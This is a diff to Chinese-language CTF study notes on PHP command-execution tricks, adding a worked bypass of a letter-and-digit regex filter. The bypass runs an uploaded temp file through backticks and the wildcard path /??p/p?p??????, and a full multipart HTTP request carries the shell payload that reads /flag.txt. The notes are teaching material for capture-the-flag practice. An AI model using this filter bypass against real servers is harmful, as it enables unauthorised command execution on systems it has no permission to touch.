@@ -4,6 +4,14 @@ typora-copy-images-to: ./..\images
 
 # 1.命令执行函数
 
+
+
+首先科普一个PHP的特性: 单引号包裹的内容只能当做纯字符串, 而双引号包裹的内容, 可以识别变量, 所以源码中的 "$url" 可以当做 $url 变量被正常执行
+
+switch循环有一个特点, 如果 case条件对应的代码体中没有 break或者其他循环控制的关键字, 则会继续执行下一个 case条件的代码, 这里我们传递 3, echo '@A@' 以后, 会继续执行 case 
+
+
+
 **命令执行后面得加分号 ；**
 
 ### 1.system()
@@ -501,6 +509,10 @@ phpsession:将命令改为16进制编码
 
 ## scandir读取
 
+print_r()打印
+
+**show_source函数是highlight_file()函数的别名）此函数是对文件进行 PHP 语法高亮显示**
+
 scandir()--列出指定路径下的所有文件
 getcwd()--返回当前工作目录
 current()--返回数组的第一个元素
@@ -771,4 +783,99 @@ exp=print_r(scandir(pos(localeconv())))
 打印数组
 
 exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
+
+# 无数字无字母无~^
+
+源码
+
+```php
+if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
+    die("cerror");
+    }
+if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
+    die("serror");
+    }
+eval($cmd);
+```
+
+只可以使用p ` ? / + < > =1
+
+思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用eval函数进行执行临时文件。
+
+## `<?= $cmd ?> 等于 <?php echo($cmd) ?>`
+
+在php中，`<? ?>`称为短标签，`<?php ?>`称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.4.0以后， `<?= `总是可代替 `<? echo`。还要使用`?>`将前面的闭合掉
+
+## 反引号``（键盘Tab键上面那个键）
+
+  在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行
+
+## 点 .
+
+​    点命令等于source命令，用来执行文件。
+
+​    source /home/user/bash  等同于  . /home/user/bash
+
+## 加号 +
+
+​    URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。
+
+## /??p/p?p??????
+
+### ：临时文件夹目录
+
+        php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是/tmp目录。
+
+### ：临时文件命名规则
+
+        默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp  linux下：phpXXXXXX。
+
+### ：通配符
+
+        问号?代表一个任意字符，通配符/??p/p?p??????匹配/tmp/phpxxxxxx
+## 上传文件
+
+### Content-Type
+
+​      Content-Type有两个值：
+
+```
+application/x-www-form-urlencoded(默认值) ：上传键值对
+multipart/form-data：上传文件
+```
+
+
+
+### boundary
+
+​        boundary为边界分隔符
+
+        文件开始标记：-----------------------------10242300956292313528205888
+    
+        文件结束标记：-----------------------------10242300956292313528205888--
+    
+        其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
+
+### 文件内容
+
+​        #! /bin/sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh。首先用命令ls /  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用cat /flag.txt 即可。
+
+
+
+请求头修改了三个地方
+
+```php
+POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
+ 
+Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
+ 
+-----------------------------10242300956292313528205888
+Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
+Content-Type: text/plain
+ 
+#! /bin/sh
+ 
+cat /flag.txt
+-----------------------------10242300956292313528205888--
+```
 
